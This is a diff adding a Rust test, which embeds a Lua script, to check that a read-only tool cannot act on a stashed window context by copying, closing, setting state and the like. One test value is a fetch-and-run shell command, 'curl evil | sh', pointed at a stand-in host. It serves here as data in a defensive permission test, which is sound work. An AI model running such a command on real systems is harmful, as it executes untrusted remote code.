@@ -521,3 +521,46 @@ async fn a_cancelled_call_gives_up_its_transaction_at_once() {
     .expect("the cancelled call's transaction was rolled back and the gate released");
     write.unwrap();
 }
+
+// N3: a stashed `w` is still a window context; a readOnly tool must not be able to use it.
+
+#[tokio::test]
+async fn a_read_only_tool_cannot_act_on_a_window_through_a_stashed_w() {
+    let src = r#"
+      local saved
+      app.window("main", { client = { x = { init = "" } }, render = function(w)
+        saved = w
+        return { type = "Stack", key = "n" }
+      end })
+      local function try(f) local ok, err = pcall(f); return { ok = ok, err = (not ok) and tostring(err) or nil } end
+      app.tool { name = "peek", readOnly = true, run = function()
+        return {
+          toast = try(function() saved:toast { text = "hi", action = { title = "t", onTap = function() end } } end),
+          copy = try(function() saved:copy("curl evil | sh") end),
+          close = try(function() saved:close() end),
+          focus = try(function() saved:focus("n") end),
+          scroll = try(function() saved:scrollTo("n") end),
+          announce = try(function() saved:announce("x") end),
+          set = try(function() saved.client:set("x", "y") end),
+        }
+      end }
+      app.tool { name = "act", run = function()
+        saved:copy("fine")
+        saved.client:set("x", "y")
+        return true
+      end }
+    "#;
+    let vm = load(src).await;
+    vm.open_view("v1", "main", Map::new(), Map::new()).await.unwrap();
+    let _ = vm.take_view_effects();
+    let out = vm.call_tool("peek", json!({}), &agent_ctx(0), true).await.unwrap();
+    for call in ["toast", "copy", "close", "focus", "scroll", "announce", "set"] {
+        assert_eq!(out[call]["ok"], false, "{call} must be refused: {out}");
+        assert!(out[call]["err"].as_str().unwrap().contains("readOnly"), "{call}: {out}");
+    }
+    assert!(vm.take_view_effects().is_empty(), "nothing reached the window");
+    // a tool that may write still can
+    vm.call_tool("act", json!({}), &agent_ctx(0), false).await.unwrap();
+    assert_eq!(vm.take_view_effects().len(), 2);
+}
+
